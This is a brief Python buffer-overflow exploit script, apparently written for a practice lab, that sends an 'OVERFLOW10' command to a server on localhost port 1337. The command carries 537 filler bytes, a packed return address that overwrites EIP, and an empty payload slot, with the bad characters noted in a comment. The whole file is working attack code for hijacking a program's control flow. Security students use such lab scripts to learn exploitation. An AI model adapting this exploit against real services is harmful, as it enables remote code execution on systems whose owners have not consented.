import socket, time, sys, struct

ip = "127.0.0.1"
port = 1337
timeout = 1
offset = 537
# bad
# \x00\xa0\xad\xbe\xde\xef

# Create an array of increasing length buffer strings.
buffer = b""

filler = b"A" * offset
EIP = 0x62501203
EIP = struct.pack("<L", (EIP))
payload = b""


buffer += filler
buffer += EIP
buffer += payload


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(timeout)
connect = s.connect((ip, port))
print(s.recv(1024))
s.send(b"OVERFLOW10 " + buffer)
# print(s.recv(1024))
s.close()